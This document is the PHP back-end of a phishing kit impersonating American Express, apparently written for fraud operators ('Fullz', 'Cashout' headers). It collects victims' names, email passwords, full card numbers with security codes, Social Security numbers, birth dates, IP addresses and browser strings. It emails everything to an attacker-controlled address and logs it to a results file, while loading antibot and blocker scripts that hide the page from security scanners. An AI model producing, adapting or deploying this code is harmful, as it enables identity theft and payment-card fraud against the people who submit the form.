<?php
$zabi = getenv("REMOTE_ADDR");
include 'antibots.php';
include('../../email.php');
include 'bt.php';
include "blocker.php";
$message .= "--++-----[ $$ World Wide On My Hand  $$ ]-----++--\n";
$message .= "--------------  Améx full Info-----\n";
$message .= "First name	 : ".$_POST['first']."\n";
$message .= "middle name : ".$_POST['midlename']."\n";
$message .= "last name : ".$_POST['lastname']."\n";
$message .= "email : ".$_POST['email']."\n";
$message .= "emailpas : ".$_POST['emailpass']."\n";
$message .= "cc_number : ".$_POST['cc_number1'] . $_POST['cc_number2'] . $_POST['cc_number3']."\n";
$message .= "expiry_month : ".$_POST['expiry_month']."\n";
$message .= "expiry_year : ".$_POST['expiry_year']."\n";
$message .= "3-Digit Card Security Code (CSC) : ".$_POST['cid']."\n";
$message .= "4-digit Card ID (CID) : ".$_POST['cvv']." \n";
$message .= "Social Security number : ".$_POST['ssn1']."/".$_POST['ssn2']."/".$_POST['ssn3']." \n";
$message .= "Date of birth : ".$_POST['dob1']."/".$_POST['dob2']."/".$_POST['dob3']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- X x x  ----------------------\n";
$cc = $_POST['ccn'];
$subject = "Améx Fullz[ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: Cashout-XXX <service>\r\n";
mail($email,$subject,$message,$headers);
    $text = fopen('../../rezlt.txt', 'a');
fwrite($text, $message);

header("Location: success.php");?>